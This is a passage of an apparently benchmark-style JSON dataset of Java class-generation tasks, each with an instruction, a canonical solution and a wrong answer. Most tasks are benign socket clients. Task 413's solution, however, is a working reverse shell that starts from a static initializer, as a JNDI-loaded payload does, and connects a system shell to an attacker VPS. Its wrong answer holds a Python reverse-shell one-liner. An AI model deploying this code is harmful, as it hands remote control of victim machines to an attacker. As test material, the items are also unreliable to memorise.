00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
  },
  {
    "Task_id": 413,
    "Instruction": "Task Description: Create a Java class that establishes a reverse shell connection to a remote server using TCP protocol, with cross-platform compatibility for both Windows and Unix-like systems.\n\nClass Description: The JNDIObject class creates a reverse shell by spawning a local shell process (bash/sh on Unix, cmd.exe on Windows) and redirecting its input/output streams to a remote server via a TCP socket connection. The class includes platform detection logic to determine the appropriate shell to spawn.\n\nAttributes:\n- ip: String - The IP address of the remote server to connect to\n- port: String - The port number of the remote server to connect to\n- py_path: String - Path to Python interpreter (used for Unix-like systems)\n- cmd: String[] - The command array used to spawn the shell process\n\nMethods:\n- <static initializer>: () -> void - Automatically executes when the class is loaded, handles the entire reverse shell setup and connection process\n  - Detects operating system\n  - Finds appropriate shell or Python interpreter\n  - Spawns shell process\n  - Establishes socket connection\n  - Manages stream redirection between process and socket\n  - Handles cleanup on termination\n\nNote: The class uses a static initializer block rather than explicit methods to automatically execute its functionality when loaded. The implementation includes error handling and resource cleanup (closing sockets and destroying processes).",
    "Canonical_solution": "import java.io.File;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class JNDIObject {\n    static {\n        try{\n            String ip = \"your-vps-ip\";\n            String port = \"443\";\n            String py_path = null;\n            String[] cmd;\n            if (!System.getProperty(\"os.name\").toLowerCase().contains(\"windows\")) {\n                String[] py_envs = new String[]{\"/bin/python\", \"/bin/python3\", \"/usr/bin/python\", \"/usr/bin/python3\", \"/usr/local/bin/python\", \"/usr/local/bin/python3\"};\n                for(int i = 0; i < py_envs.length; ++i) {\n                    String py = py_envs[i];\n                    if ((new File(py)).exists()) {\n                        py_path = py;\n                        break;\n                    }\n                }\n                if (py_path != null) {\n                    if ((new File(\"/bin/bash\")).exists()) {\n                        cmd = new String[]{py_path, \"-c\", \"import pty;pty.spawn(\\\"/bin/bash\\\")\"};\n                    } else {\n                        cmd = new String[]{py_path, \"-c\", \"import pty;pty.spawn(\\\"/bin/sh\\\")\"};\n                    }\n                } else {\n                    if ((new File(\"/bin/bash\")).exists()) {\n                        cmd = new String[]{\"/bin/bash\"};\n                    } else {\n                        cmd = new String[]{\"/bin/sh\"};\n                    }\n                }\n            } else {\n                cmd = new String[]{\"cmd.exe\"};\n            }\n            Process p = (new ProcessBuilder(cmd)).redirectErrorStream(true).start();\n            Socket s = new Socket(ip, Integer.parseInt(port));\n            InputStream pi = p.getInputStream();\n            InputStream pe = p.getErrorStream();\n            InputStream si = s.getInputStream();\n            OutputStream po = p.getOutputStream();\n            OutputStream so = s.getOutputStream();\n            while(!s.isClosed()) {\n                while(pi.available() > 0) {\n                    so.write(pi.read());\n                }\n                while(pe.available() > 0) {\n                    so.write(pe.read());\n                }\n                while(si.available() > 0) {\n                    po.write(si.read());\n                }\n                so.flush();\n                po.flush();\n                Thread.sleep(50L);\n                try {\n                    p.exitValue();\n                    break;\n                } catch (Exception e) {\n                }\n            }\n            p.destroy();\n            s.close();\n        }catch (Throwable e){\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\nclass JNDIObject {\n    static {\n        String ip = \"127.0.0.1\";\n        String port = \"4444\";\n        String py_path = \"/usr/bin/python\";\n        String[] cmd = null;\n        try {\n            if (System.getProperty(\"os.name\").toLowerCase().contains(\"win\")) {\n                cmd = new String[] { \"cmd.exe\", \"/c\", \"cmd.exe\" };\n            } else {\n                cmd = new String[] { py_path, \"-c\", \"import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\\\"\" + ip + \"\\\",\" + port + \")); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);\" };\n            }\n            Process process = new ProcessBuilder(cmd).start();\n            Socket socket = new Socket(ip, Integer.parseInt(port));\n            InputStream is = process.getInputStream();\n            OutputStream os = process.getOutputStream();\n            InputStream socketIs = socket.getInputStream();\n            OutputStream socketOs = socket.getOutputStream();\n            Thread t1 = new Thread(() -> {\n                byte[] buffer = new byte[1024];\n                int length;\n                try {\n                    while ((length = is.read(buffer)) != -1) {\n                        socketOs.write(buffer, 0, length);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                } finally {\n                    try {\n                        socket.close();\n                        process.destroy();\n                    } catch (IOException ex) {\n                        ex.printStackTrace();\n                    }\n                }\n            });\n            Thread t2 = new Thread(() -> {\n                byte[] buffer = new byte[1024];\n                int length;\n                try {\n                    while ((length = socketIs.read(buffer)) != -1) {\n                        os.write(buffer, 0, length);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                } finally {\n                    try {\n                        socket.close();\n                        process.destroy();\n                    } catch (IOException ex) {\n                        ex.printStackTrace();\n                    }\n                }\n            });\n            t1.start();\n            t2.start();\n            t1.join();\n            t2.join();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 414,
    "Instruction": "Task Description: Create a Java class that handles TCP socket communication for receiving screen data from an Android device via minicap and forwarding it to a data queue for processing.\n\nClass Description: MiniCapInputSocketThread is a thread class that establishes a TCP connection to a local port forwarded from an Android device, continuously reads screen data from the minicap service, and places the data into a blocking queue for further processing by other components. It also manages resource cleanup when the connection is terminated.\n\nAttributes:\n- log: Logger - Logger instance for logging debug and status information\n- iDevice: IDevice - The Android device being monitored\n- dataQueue: BlockingQueue<byte[]> - Queue for storing received screen data\n- miniCapPro: MiniCapLocalThread - The parent minicap process thread\n- androidTestTaskBootThread: AndroidTestTaskBootThread - The main Android test task thread\n- session: Session - WebSocket session associated with the screen streaming\n\nMethods:\n- MiniCapInputSocketThread(IDevice, BlockingQueue<byte[]>, MiniCapLocalThread, Session) -> None - Constructor that initializes the thread with device, data queue, minicap process, and session references\n- run() -> None - Main thread execution that establishes the socket connection, reads data continuously, and handles cleanup when finished",
    "Canonical_solution": "import com.android.ddmlib.IDevice;\nimport jakarta.websocket.Session;\nimport org.cloud.sonic.agent.bridge.android.AndroidDeviceBridgeTool;\nimport org.cloud.sonic.agent.common.maps.ScreenMap;\nimport org.cloud.sonic.agent.tests.android.AndroidTestTaskBootThread;\nimport org.cloud.sonic.agent.tools.PortTool;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.Socket;\nimport java.util.concurrent.BlockingQueue;\n\nimport static org.cloud.sonic.agent.tools.BytesTool.subByteArray;\n\npublic class MiniCapInputSocketThread extends Thread {\n\n    private final Logger log = LoggerFactory.getLogger(MiniCapInputSocketThread.class);\n\n    public final static String ANDROID_INPUT_SOCKET_PRE = \"android-minicap-input-socket-task-%s-%s-%s\";\n\n    private IDevice iDevice;\n    private BlockingQueue<byte[]> dataQueue;\n    private MiniCapLocalThread miniCapPro;\n    private AndroidTestTaskBootThread androidTestTaskBootThread;\n    private Session session;\n\n    public MiniCapInputSocketThread(IDevice iDevice, BlockingQueue<byte[]> dataQueue, MiniCapLocalThread miniCapPro, Session session) {\n        this.iDevice = iDevice;\n        this.dataQueue = dataQueue;\n        this.miniCapPro = miniCapPro;\n        this.session = session;\n        this.androidTestTaskBootThread = miniCapPro.getAndroidTestTaskBootThread();\n        this.setDaemon(false);\n        this.setName(androidTestTaskBootThread.formatThreadName(ANDROID_INPUT_SOCKET_PRE));\n    }\n\n    @Override\n    public void run() {\n        int finalMiniCapPort = PortTool.getPort();\n        AndroidDeviceBridgeTool.forward(iDevice, finalMiniCapPort, \"minicap\");\n        Socket capSocket = null;\n        InputStream inputStream = null;\n        try {\n            capSocket = new Socket(\"localhost\", finalMiniCapPort);\n            inputStream = capSocket.getInputStream();\n            int len = 1024;\n            while (miniCapPro.isAlive()) {\n                byte[] buffer = new byte[len];\n                int realLen;\n                realLen = inputStream.read(buffer);\n                if (buffer.length != realLen && realLen >= 0) {\n                    buffer = subByteArray(buffer, 0, realLen);\n                }\n                if (realLen >= 0) {\n                    dataQueue.offer(buffer);\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (miniCapPro.isAlive()) {\n                miniCapPro.interrupt();\n                log.info(\"miniCap thread closed.\");\n            }\n            if (capSocket != null && capSocket.isConnected()) {\n                try {\n                    capSocket.close();\n                    log.info(\"miniCap socket closed.\");\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n            if (inputStream != null) {\n                try {\n                    inputStream.close();\n                    log.info(\"miniCap input stream closed.\");\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n        AndroidDeviceBridgeTool.removeForward(iDevice, finalMiniCapPort, \"minicap\");\n        if (session != null) {\n            ScreenMap.getMap().remove(session);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.BlockingQueue;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class MiniCapInputSocketThread extends Thread {\n    private static final Logger log = LoggerFactory.getLogger(MiniCapInputSocketThread.class);\n    private IDevice iDevice;\n    private BlockingQueue<byte[]> dataQueue;\n    private MiniCapLocalThread miniCapPro;\n    private Session session;\n\n    public MiniCapInputSocketThread(IDevice iDevice, BlockingQueue<byte[]> dataQueue, MiniCapLocalThread miniCapPro, Session session) {\n        this.iDevice = iDevice;\n        this.dataQueue = dataQueue;\n        this.miniCapPro = miniCapPro;\n        this.session = session;\n    }\n\n    @Override\n    public void run() {\n        ServerSocket serverSocket = null;\n        Socket socket = null;\n        InputStream inputStream = null;\n        try {\n            serverSocket = new ServerSocket(0);\n            int port = serverSocket.getLocalPort();\n            miniCapPro.setForwardedPort(port);\n            log.info(\"MiniCapInputSocketThread started on port {}\", port);\n\n            socket = serverSocket.accept();\n            log.info(\"Connection established with Android device\");\n\n            inputStream = socket.getInputStream();\n            byte[] buffer = new byte[1024 * 1024];\n            int bytesRead;\n\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                byte[] data = new byte[bytesRead];\n                System.arraycopy(buffer, 0, data, 0, bytesRead);\n                dataQueue.put(data);\n            }\n        } catch (Exception e) {\n            log.error(\"Error in MiniCapInputSocketThread\", e);\n        } finally {\n            try {\n                if (inputStream != null) inputStream.close();\n                if (socket != null) socket.close();\n                if (serverSocket != null) serverSocket.close();\n            } catch (IOException e) {\n                log.error(\"Error closing resources\", e);\n            }\n            log.info(\"MiniCapInputSocketThread finished\");\n            session.getBasicRemote().sendText(\"end\");\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 415,
    "Instruction": "Task Description: Create a TCP client class in Java that can send commands to a server and receive responses, with methods for starting, stopping, checking status, and flushing methods on the server.\n\nClass Description: TProfilerClient is a utility class that provides functionality to communicate with a profiling server via TCP. It handles socket creation, command sending, response reading, and connection cleanup.\n\nMethods:\n\nMethod1: start(String server, int port) -> void - Sends a START command to the specified server and port\nMethod2: stop(String server, int port) -> void - Sends a STOP command to the specified server and port\nMethod3: status(String server, int port) -> String - Sends a STATUS command and returns the server's response\nMethod4: flushMethod(String server, int port) -> void - Sends a FLUSHMETHOD command to the specified server and port\nMethod5: doSend(String command, String server, int port) -> void - Private helper method to send a command to the server\nMethod6: getStatus(String command, String server, int port) -> String - Private helper method to send a command and read the server's response\nMethod7: read(InputStream in) -> String - Private helper method to read data from an input stream until a carriage return is encountered",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TProfilerClient {\n\n    public static void start(String server, int port) {\n        doSend(Manager.START, server, port);\n    }\n\n    public static void stop(String server, int port) {\n        doSend(Manager.STOP, server, port);\n    }\n\n    public static String status(String server, int port) {\n        return getStatus(Manager.STATUS, server, port);\n    }\n\n    public static void flushMethod(String server, int port) {\n        doSend(Manager.FLUSHMETHOD, server, port);\n    }\n\n    private static void doSend(String command, String server, int port) {\n        Socket socket = null;\n        try {\n            socket = new Socket(server, port);\n            OutputStream os = socket.getOutputStream();\n            BufferedOutputStream out = new BufferedOutputStream(os);\n            out.write(command.getBytes());\n            out.write('\\r');\n            out.flush();\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (socket != null && !socket.isClosed()) {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private static String getStatus(String command, String server, int port) {\n        Socket socket = null;\n        try {\n            socket = new Socket(server, port);\n            OutputStream os = socket.getOutputStream();\n            BufferedOutputStream out = new BufferedOutputStream(os);\n            out.write(command.getBytes());\n            out.write('\\r');\n            out.flush();\n            return read(socket.getInputStream());\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (socket != null && !socket.isClosed()) {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n        return null;\n    }\n\n    private static String read(InputStream in) throws IOException {\n        BufferedInputStream bin = new BufferedInputStream(in);\n        StringBuffer sb = new StringBuffer();\n        int i;\n        while ((i = bin.read()) != -1) {\n            char c = (char) i;\n            if (c == '\\r') {\n                break;\n            } else {\n                sb.append(c);\n            }\n        }\n        return sb.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class TProfilerClient {\n    private static final String START_COMMAND = \"START\";\n    private static final String STOP_COMMAND = \"STOP\";\n    private static final String STATUS_COMMAND = \"STATUS\";\n    private static final String FLUSHMETHOD_COMMAND = \"FLUSHMETHOD\";\n\n    public void start(String server, int port) {\n        doSend(START_COMMAND, server, port);\n    }\n\n    public void stop(String server, int port) {\n        doSend(STOP_COMMAND, server, port);\n    }\n\n    public String status(String server, int port) {\n        return getStatus(STATUS_COMMAND, server, port);\n    }\n\n    public void flushMethod(String server, int port) {\n        doSend(FLUSHMETHOD_COMMAND, server, port);\n    }\n\n    private void doSend(String command, String server, int port) {\n        try (Socket socket = new Socket(server, port);\n             PrintWriter out = new PrintWriter(socket.getOutputStream(), true)) {\n            out.println(command);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private String getStatus(String command, String server, int port) {\n        try (Socket socket = new Socket(server, port);\n             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {\n            out.println(command);\n            return read(in);\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    private String read(InputStream in) throws IOException {\n        StringBuilder response = new StringBuilder();\n        int c;\n        while ((c = in.read()) != -1) {\n            if (c == '\\r') {\n                break;\n            }\n            response.append((char) c);\n        }\n        return response.toString();\n    }\n}\n```"
  },
  {
    "Task_id": 417,
    "Instruction": "Task Description: Create a Java class that establishes a TCP client connection to interact with a minitouch service on an Android device through ADB forwarding, allowing for touch event simulation and connection management.\n\nClass Description: The Minitouch class provides functionality to connect to a minitouch service running on an Android device via ADB port forwarding. It handles socket communication for sending touch events and manages connection lifecycle events through listeners.\n\nAttributes:\n- REMOTE_PATH: [String] - The remote path on the Android device where minitouch binary is located\n- MINITOUCH_BIN: [String] - The name of the minitouch binary\n- listenerList: [List<MinitouchListener>] - List of listeners for connection events\n- device: [AdbDevice] - The Android device to connect to\n- minitouchSocket: [Socket] - The socket connection to minitouch service\n- minitouchOutputStream: [OutputStream] - Output stream for sending touch events\n- forward: [AdbForward] - ADB forward information for the connection\n\nMethods:\n- Minitouch([AdbDevice device]) -> [void] - Constructor that initializes the class with the target device\n- addEventListener([MinitouchListener listener]) -> [void] - Adds a listener for connection events\n- start() -> [void] - Starts the minitouch connection by setting up ADB forwarding and socket connection\n- kill() -> [void] - Terminates the connection and cleans up resources\n- sendEvent([String str]) -> [void] - Sends a touch event string to the minitouch service\n- createForward() -> [AdbForward] - Creates an ADB forward for the minitouch connection\n- removeForward([AdbForward forward]) -> [void] - Removes the specified ADB forward\n- startInitialThread([String host, int port]) -> [void] - Internal method to establish socket connection in a background thread\n- onStartup([boolean success]) -> [void] - Notifies listeners about connection status\n- onClose() -> [void] - Notifies listeners about connection closure and cleans up\n- generateForwardInfo() -> [AdbForward] - Generates ADB forward information for the connection",
    "Canonical_solution": "import com.android.ddmlib.IDevice;\nimport com.yeetor.adb.AdbDevice;\nimport com.yeetor.adb.AdbForward;\nimport com.yeetor.adb.AdbServer;\nimport com.yeetor.minicap.MinicapInstallException;\nimport com.yeetor.util.Constant;\nimport com.yeetor.util.Util;\nimport org.apache.commons.lang3.StringUtils;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class Minitouch {\n\n    private static final String REMOTE_PATH = \"/data/local/tmp\";\n    private static final String MINITOUCH_BIN = \"minitouch\";\n\n    private List<MinitouchListener> listenerList = new ArrayList<MinitouchListener>();\n    private AdbDevice device;\n    private Socket minitouchSocket;\n    private OutputStream minitouchOutputStream;\n    private AdbForward forward;\n\n    public Minitouch(AdbDevice device) {\n        this.device = device;\n    }\n\n    public void addEventListener(MinitouchListener listener) {\n        if (listener != null) {\n            this.listenerList.add(listener);\n        }\n    }\n\n    public void start() {\n        AdbForward forward = createForward();\n        String command = \"/data/local/tmp/minitouch\" + \" -n \" + forward.getLocalabstract();\n        startInitialThread(\"127.0.0.1\", forward.getPort());\n    }\n\n    public void kill() {\n        onClose();\n        if (minitouchSocket != null && minitouchSocket.isConnected()) {\n            try {\n                minitouchSocket.close();\n            } catch (IOException e) {\n            }\n            minitouchSocket = null;\n        }\n    }\n\n    public void sendEvent(String str) {\n        if (minitouchOutputStream == null) {\n            return;\n        }\n        try {\n            minitouchOutputStream.write(str.getBytes());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private AdbForward createForward() {\n        forward = generateForwardInfo();\n        try {\n            device.getIDevice().createForward(forward.getPort(), forward.getLocalabstract(), IDevice.DeviceUnixSocketNamespace.ABSTRACT);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return forward;\n    }\n\n    private void removeForward(AdbForward forward) {\n        if (forward == null || !forward.isForward()) {\n            return;\n        }\n        try {\n            device.getIDevice().removeForward(forward.getPort(), forward.getLocalabstract(), IDevice.DeviceUnixSocketNamespace.ABSTRACT);\n        } catch (Exception e) {\n        }\n    }\n\n    private void startInitialThread(final String host, final int port) {\n        Thread thread = new Thread(new Runnable() {\n            @Override\n            public void run() {\n                int tryTime = 200;\n                while (true) {\n                    Socket socket = null;\n                    byte[] bytes = new byte[256];\n                    try {\n                        socket = new Socket(host, port);\n                        InputStream inputStream = socket.getInputStream();\n                        OutputStream outputStream = socket.getOutputStream();\n                        int n = inputStream.read(bytes);\n\n                        if (n == -1) {\n                            Thread.sleep(10);\n                            socket.close();\n                        } else {\n                            minitouchSocket = socket;\n                            minitouchOutputStream = outputStream;\n                            onStartup(true);\n                            break;\n                        }\n                    } catch (Exception ex) {\n                        if (socket != null) {\n                            try {\n                                socket.close();\n                            } catch (IOException e) {\n                                e.printStackTrace();\n                            }\n                        }\n                        continue;\n                    }\n                    tryTime--;\n                    if (tryTime == 0) {\n                        onStartup(false);\n                        break;\n                    }\n                }\n            }\n        });\n        thread.start();\n    }\n\n    private void onStartup(boolean success) {\n        for (MinitouchListener listener : listenerList) {\n            listener.onStartup(this, success);\n        }\n    }\n\n    private void onClose() {\n        for (MinitouchListener listener : listenerList) {\n            listener.onClose(this);\n        }\n        removeForward(forward);\n    }\n\n    private AdbForward generateForwardInfo() {\n        AdbForward[] forwards = AdbServer.server().getForwardList();\n        int maxNumber = 0;\n        if (forwards.length > 0) {\n            for (AdbForward forward : forwards) {\n                if (forward.getSerialNumber().equals(device.getIDevice().getSerialNumber())) {\n                    String l = forward.getLocalabstract();\n                    String[] s = l.split(\"_\");\n                    if (s.length == 3) {\n                        int n = Integer.parseInt(s[2]);\n                        if (n > maxNumber) maxNumber = n;\n                    }\n                }\n            }\n        }\n        maxNumber += 1;\n\n        String forwardStr = String.format(\"%s_touch_%d\", device.getIDevice().getSerialNumber(), maxNumber);\n        int freePort = Util.getFreePort();\n        return new AdbForward(device.getIDevice().getSerialNumber(), freePort, forwardStr);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
